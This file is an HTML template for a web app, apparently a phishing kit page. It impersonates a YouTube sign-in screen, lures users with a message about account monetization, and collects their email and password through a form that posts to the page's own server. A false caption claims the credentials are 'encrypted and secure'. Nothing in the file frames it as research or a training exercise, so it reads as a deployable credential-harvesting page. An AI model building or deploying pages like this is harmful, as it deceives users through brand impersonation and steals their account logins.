{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(255, 0, 0, 0.15);border-radius:16px;">
  <div class="platform-header">
    <div class="icon-circle bg-youtube">
      <i class="fa-brands fa-youtube icon-lg"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#FF0000;">YouTube</h2>
      <div style="color:#64748b;font-size:13px">Please login to continue with your account monetization.</div>
    </div>
  </div>

  <form id="loginForm" method="post" novalidate>
    <input class="input" id="address" name="address" placeholder="Email address" required>
    <div class="error-text" id="addressError"></div>

    <input class="input" id="password" name="password" type="password" placeholder="Password" required>
    <div class="error-text" id="passwordError"></div>

    <button class="btn login-btn" type="submit">Log in</button>
  </form>

  <!-- ADDED SECURITY CAPTION -->
  <div class="security-note" style="margin-top:20px;padding:12px 16px;background:#ffebee;border-radius:12px;border:1px solid #fecaca;">
    <p style="margin:0;color:#991b1b;font-size:0.9rem;font-weight:500;text-align:center;">
      ðŸ”’ Your login credentials are encrypted and secure
    </p>
  </div>
</div>

<style>
.input {
  width: 100%;
  padding: 14px;
  border-radius: 18px;
  border: 1px solid #e5e7eb;
  margin-bottom: 8px;
  font-size: 16px;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.input:focus {
  border-color: #9ca3af; /* same as button */
  box-shadow: 0 0 0 3px rgba(156, 163, 175, 0.25);
  outline: none;
}
.input-error {
  border-color: #ef4444;
  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
}
.error-text {
  color: #ef4444;
  font-size: 13px;
  margin-top: -4px;
  margin-bottom: 8px;
}

.login-btn {
  width: 100%;
  background: #9ca3af; /* Gray button */
  color: #fff;
  font-size: 16px;
  font-weight: 700;
  padding: 12px;
  border-radius: 25px;
  cursor: pointer;
  border: none;
  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
  box-shadow: 0 4px 12px rgba(107, 114, 128, 0.25);
  display: block;
  margin-top: 8px;
}
.login-btn:hover {
  background: #6b7280;
  box-shadow: 0 6px 16px rgba(107, 114, 128, 0.35);
}
.login-btn:active {
  transform: scale(0.985);
}
</style>

<script>
document.getElementById("loginForm").addEventListener("submit", function(event) {
  const address = document.getElementById("address");
  const password = document.getElementById("password");
  const addressError = document.getElementById("addressError");
  const passwordError = document.getElementById("passwordError");

  const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.(com|net|org|co|io|me|info|biz)$/;

  let valid = true;
  [address, password].forEach(input => input.classList.remove("input-error"));
  [addressError, passwordError].forEach(el => el.textContent = "");

  const addrVal = address.value.trim();

  if (!emailPattern.test(addrVal)) {
    valid = false;
    address.classList.add("input-error");
    addressError.textContent = "Enter a valid lowercase email (e.g. name@email.com).";
  }

  if (password.value.trim().length < 6) {
    valid = false;
    password.classList.add("input-error");
    passwordError.textContent = "Password must be at least 6 characters.";
  }

  if (!valid) event.preventDefault();
});

document.querySelectorAll(".input").forEach(input => {
  input.addEventListener("input", () => {
    input.classList.remove("input-error");
    if (input.id === "address") document.getElementById("addressError").textContent = "";
    if (input.id === "password") document.getElementById("passwordError").textContent = "";
  });
});
</script>
{% endblock %}
